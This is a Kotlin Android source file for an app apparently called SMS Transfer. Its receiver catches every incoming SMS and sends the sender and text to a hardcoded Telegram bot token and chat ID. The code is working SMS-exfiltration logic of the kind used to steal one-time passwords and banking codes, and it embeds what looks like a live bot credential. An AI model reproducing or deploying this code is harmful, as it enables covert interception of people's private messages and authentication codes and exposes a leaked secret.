package com.smstransfer.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.widget.Toast
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class SmsReceiver : BroadcastReceiver() {
    
    companion object {
        const val BOT_TOKEN = "8523158193:AAE7LKktxM-vq13I1aoHqyID6BTdfTJUnv8"
        const val USER_ID = "5967798239"
        
        fun startSmsForwarding(context: Context) {
            // Broadcast receiver already registered in manifest
            Toast.makeText(context, "SMS ফরওয়ার্ডিং সক্রিয়", Toast.LENGTH_SHORT).show()
        }
    }
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val smsMessages = getSmsMessages(intent)
            for (sms in smsMessages) {
                val sender = sms.displayOriginatingAddress
                val message = sms.messageBody
                val timestamp = System.currentTimeMillis()
                
                // Show notification
                Toast.makeText(
                    context, 
                    "নতুন SMS: $sender", 
                    Toast.LENGTH_SHORT
                ).show()
                
                // Forward to Telegram
                forwardToTelegram(sender ?: "Unknown", message ?: "")
            }
        }
    }
    
    private fun getSmsMessages(intent: Intent): Array<SmsMessage> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } else {
            @Suppress("DEPRECATION")
            val pdus = intent.extras?.get("pdus") as? Array<ByteArray> ?: return emptyArray()
            val messages = arrayOfNulls<SmsMessage>(pdus.size)
            for (i in pdus.indices) {
                messages[i] = SmsMessage.createFromPdu(pdus[i])
            }
            messages.filterNotNull().toTypedArray()
        }
    }
    
    private fun forwardToTelegram(sender: String, message: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val text = """
                    📱 *নতুন এসএমএস*
                    
                    *প্রেরক:* $sender
                    *বার্তা:* $message
                    
                    _${java.text.SimpleDateFormat("dd-MM-yyyy HH:mm:ss").format(java.util.Date())}_
                """.trimIndent()
                
                val encodedText = URLEncoder.encode(text, "UTF-8")
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                
                val postData = "chat_id=$USER_ID&text=$encodedText&parse_mode=Markdown"
                connection.outputStream.use { os ->
                    os.write(postData.toByteArray())
                }
                
                val responseCode = connection.responseCode
                connection.disconnect()
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
